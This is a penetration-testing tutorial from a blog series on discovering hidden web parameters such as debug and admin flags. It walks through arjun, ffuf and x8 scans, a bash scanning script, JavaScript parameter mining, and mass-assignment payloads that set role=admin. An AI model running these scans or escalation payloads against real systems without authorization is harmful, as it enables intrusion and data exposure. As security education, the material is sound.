# Hidden Parameter Discovery: Finding the Inputs Developers Forgot to Remove

**Severity:** MEDIUM | **Category:** Recon | **Series:** #300DaysWithAppSec

---

## The Endpoint Is Public. The Parameter Is Invisible.

Every web developer has done this: added a `?debug=true` parameter while building a feature, used it in development to get extra logging output, then shipped to production — and forgot it was there.

The parameter doesn't appear in any form. There's no link to it. No documentation mentions it. But the server still processes it. And when an attacker sends `?debug=true`, they suddenly see stack traces, SQL queries, environment variables, and internal paths that were never meant to be public.

This is hidden parameter discovery — finding the inputs that exist on the server but are invisible to the normal user interface.

---

## Why Hidden Parameters Exist

Developers add parameters for legitimate reasons during development:

```
?debug=true        → Shows verbose error output
?verbose=1         → Extra logging in API responses  
?test=1            → Skips payment processing in test mode
?admin=1           → Bypasses certain auth checks during dev
?format=json       → Alternative response format (not in UI)
?export=csv        → Triggers data export endpoint
?version=2         → Old API version still supported
```

The problem: these are added quickly and removed inconsistently. In a codebase with 20 developers, someone adds `?admin=1` on a Friday, it works, they push it — and it quietly ships to production because no security review catches it.

---

## The Impact When You Find One

### Scenario 1: Debug Mode Exposes Internals

```bash
# Normal request
GET /api/users/1
Response: {"id":1,"name":"Alice","email":"alice@company.com"}

# With hidden debug parameter
GET /api/users/1?debug=true
Response: {
  "id":1,"name":"Alice","email":"alice@company.com",
  "debug_info": {
    "sql_query": "SELECT * FROM users WHERE id='1'",
    "db_host": "10.0.0.5",
    "db_user": "app_user",
    "db_pass": "Sup3rS3cret!",
    "server_path": "/var/www/html/api/",
    "php_version": "7.4.3"
  }
}
```

### Scenario 2: Admin Flag Bypasses Auth Check

```bash
# Normal request — access denied
GET /api/reports/all_users
Response: 403 Forbidden — "Admin access required"

# With hidden parameter
GET /api/reports/all_users?admin=1
Response: 200 OK — full list of all users, emails, hashed passwords
```

### Scenario 3: Role Assignment via Parameter

```bash
# Registration endpoint
POST /api/register
{"email":"attacker@evil.com","password":"Password123"}
Response: {"id":42,"role":"user"}

# With hidden mass assignment parameter
POST /api/register
{"email":"attacker@evil.com","password":"Password123","role":"admin"}
Response: {"id":42,"role":"admin"}  ← mass assignment! Server trusted it
```

---

## Method 1: Arjun — Automated Parameter Discovery

Arjun is the go-to tool for this. It sends requests with batches of parameters from its wordlist and detects changes in the response that indicate a parameter was processed.

```bash
# Install
pip3 install arjun --break-system-packages

# Basic GET parameter discovery
arjun -u https://target.com/api/users/1 -m GET

# POST body parameter discovery
arjun -u https://target.com/api/register -m POST

# JSON body parameter discovery
arjun -u https://target.com/api/users -m POST \
    -T 'Content-Type: application/json'

# With authentication
arjun -u https://target.com/api/profile -m GET \
    -H "Authorization: Bearer YOUR_TOKEN"

# Bulk scan from file
arjun -i endpoints.txt -m GET -o arjun_results.json

# Output example:
# [+] Parameters found: debug, admin, verbose, export
```

### How Arjun Detects Parameters

```
1. Send baseline request → record response: status=200, len=342, time=0.4s
2. Send request with batch of 25 parameters:
   ?debug=1&admin=1&test=1&verbose=1&export=1&...
3. Compare response: status=200, len=4820 → DIFFERENT → narrow down
4. Binary search which parameter caused the difference
5. Result: "debug" causes response length to change → parameter found!
```

---

## Method 2: ffuf — Fast Fuzzing

```bash
# Install
go install github.com/ffuf/ffuf/v2@latest

# Download parameter wordlist
# From SecLists:
# /Discovery/Web-Content/burp-parameter-names.txt (6,453 params)
# Or the large version: /Discovery/Web-Content/raft-large-words.txt

# GET parameter fuzzing
ffuf -u "https://target.com/api/users/1?FUZZ=test" \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -mc 200 \
    -fs 342   # filter responses with size 342 (baseline size — change me)

# Output:
# debug   [Status: 200, Size: 4820]  ← different size! parameter found!
# export  [Status: 200, Size: 1240]  ← different size! parameter found!

# POST body parameter fuzzing
ffuf -u "https://target.com/api/register" \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "email=test@test.com&password=Test123&FUZZ=1" \
    -w burp-parameter-names.txt \
    -mc 200 -fr "error"

# JSON body parameter fuzzing
ffuf -u "https://target.com/api/users/1" \
    -X PUT \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"FUZZ":"value123"}' \
    -w burp-parameter-names.txt \
    -mc 200 -fs 342
```

---

## Method 3: x8 — Response Difference Analysis

x8 is smarter than simple fuzzing — it uses response analysis to detect parameters that cause ANY measurable difference, even subtle ones:

```bash
# Install
cargo install x8
# Or download binary: https://github.com/Sh1Yo/x8/releases

# Basic usage
x8 -u "https://target.com/api/users/1" -w params.txt

# With headers
x8 -u "https://target.com/api/users/1" \
   -H "Authorization: Bearer TOKEN" \
   -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# Output:
# Found parameters: debug, admin, format
```

---

## Method 4: Manual Testing in Burp Suite

```
1. Capture a request in Burp Repeater
2. Right-click → Extensions → Param Miner (if installed)
   → "Guess params" → let it run
3. Or manually: add common params one by one:
   ?debug=true
   ?admin=1  
   ?role=admin
   ?test=true
   ?verbose=1
   ?format=json
   ?version=2
   ?export=csv
4. Compare response size/content for each
5. Anything different = investigate!
```

---

## Method 5: Mining Parameters from JavaScript

The frontend JS code often shows what parameters the server accepts — even ones not used in the normal UI:

```bash
# Download app JS and grep for fetch/axios/XHR calls with params
curl -sk https://target.com/static/js/app.js | \
    grep -oE "\?([\w%=&+]+)" | \
    tr '?' '\n' | \
    tr '&' '\n' | \
    grep -oE "^\w+" | \
    sort -u > params_from_js.txt

# These are parameters the dev wrote — all valid fuzzing targets
# Example output:
# debug
# format
# export
# verbose
# userId
# adminView
```

---

## Complete Workflow

```bash
#!/bin/bash
TARGET="${1:-https://target.com/api/users/1}"
WORDLIST="${2:-/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt}"
TOKEN="${3:-}"

echo "=== Hidden Parameter Discovery: $TARGET ==="

# Step 1: Baseline response
BASELINE_SIZE=$(curl -sk -o /dev/null -w "%{size_download}" \
    -H "Authorization: Bearer $TOKEN" "$TARGET")
echo "[1] Baseline response size: $BASELINE_SIZE bytes"

# Step 2: Run arjun
echo "[2] Running arjun..."
arjun -u "$TARGET" -m GET \
    -H "Authorization: Bearer $TOKEN" \
    --stable --rate-limit 30 2>&1 | tail -20

# Step 3: ffuf with size filter
echo "[3] Running ffuf..."
ffuf -u "${TARGET}?FUZZ=1" \
    -w "$WORDLIST" \
    -H "Authorization: Bearer $TOKEN" \
    -fs "$BASELINE_SIZE" \
    -mc 200,201,301,302 \
    -t 50 -silent | grep "\[Status:"

# Step 4: Test found parameters manually
echo "[4] Testing common privilege params manually..."
for param in debug admin verbose test format export version internal; do
    resp=$(curl -sk -o /tmp/resp.txt -w "%{http_code}|%{size_download}" \
        -H "Authorization: Bearer $TOKEN" \
        "${TARGET}?${param}=1")
    code=$(echo $resp | cut -d'|' -f1)
    size=$(echo $resp | cut -d'|' -f2)
    if [ "$size" != "$BASELINE_SIZE" ]; then
        echo "  DIFFERENT: ?${param}=1 → $code, size=$size (baseline=$BASELINE_SIZE)"
    fi
done
```

---

## What to Do When You Find a Hidden Parameter

### Test Escalation Values

```bash
# If you found ?debug=true exists, try:
?debug=true
?debug=1
?debug=on
?debug=yes
?debug=all
?debug=verbose
?debug=sql     # Maybe shows SQL queries specifically

# If you found ?admin= exists, try:
?admin=1
?admin=true
?admin=admin
?admin=yes
```

### Test in POST Bodies

```bash
# Parameters may work in JSON bodies too
curl -X POST https://target.com/api/user/update \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer USER_TOKEN" \
    -d '{"name":"Alice","admin":true,"role":"admin","verified":true}'

# If server processes these fields → mass assignment!
```

---

## Key Takeaways

```
1. Hidden parameters = server-side inputs not exposed in the UI or docs
2. They're forgotten debug flags, legacy support, mass assignment vectors
3. arjun is the best tool — use it on every endpoint you test
4. ffuf + burp-parameter-names.txt = fast alternative
5. Mine parameters from JS files — devs often list them in fetch() calls
6. Response size/status change = parameter processed → investigate
7. Test privilege values: debug=true, admin=1, role=admin
8. Always test in both GET params and POST/JSON body
```

---

*Written by Anand Prajapati — Penetration Tester & Security Researcher*

🔗 **Connect & Follow:**
| Platform | Link |
|----------|------|
| 💼 LinkedIn | [linkedin.com/in/anand-prajapati-7a265a369](https://linkedin.com/in/anand-prajapati-7a265a369) |
| 🐙 GitHub | [github.com/anand87794](https://github.com/anand87794) |
| 🌐 Portfolio | [anandprajapati.lovable.app](https://anandprajapati.lovable.app) |
| 🐦 X | [@anand87794](https://x.com/anand87794) |

*Part of the #300DaysWithAppSec series — 300 vulnerabilities, real security education.*
